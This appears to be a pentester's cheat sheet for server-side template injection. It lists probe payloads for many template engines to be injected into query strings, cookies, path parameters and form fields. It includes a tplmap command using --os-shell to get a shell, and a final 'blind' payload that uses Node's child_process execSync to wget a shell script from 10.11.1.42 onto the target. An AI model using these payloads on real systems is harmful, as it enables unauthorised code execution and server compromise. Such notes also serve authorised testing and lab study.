Server Side Template Injection
<https://youtu.be/rJ-l_JSdUlE?list=PLkCYUwlLOT2oU3iwjCi2MiwaUvZrPFZl9&t=3860>
<https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection>

SSTI:

Attempt SSTI in fields. (Use in intruder)
<http://somesite.com/user/settings?username=>{{7*7}}

`@(4*5)`
`{{7*7}}`
`${7*7}`
`${{7*7}}`
`${{<%[%'"}}%\`
`<%= 7*7 %>`
`<%=7*7%>`
`<#assign x=7*7>${x}`
`{% nosuchtag %}`
`{self}`
`{{self}}`
`${{7*7}}`
`#{7*7}`
`*{7*7}`


Get shell if SSTI is present:
<https://github.com/epinna/tplmap>
tplmap.py -u '<http://www.target.com/page?name=John*'> --os-shell

Test in:
Query string paramater, ex: <http://example.com/page?name=value>
cookies
Path paramaters, ex:<http://example.com/page/value> (Insert into the value area, it's a path paramater)
Form Fields

Test for blind:
res.end(require('child_process')execSync('wget 10.11.1.42/uwu.sh').toString())
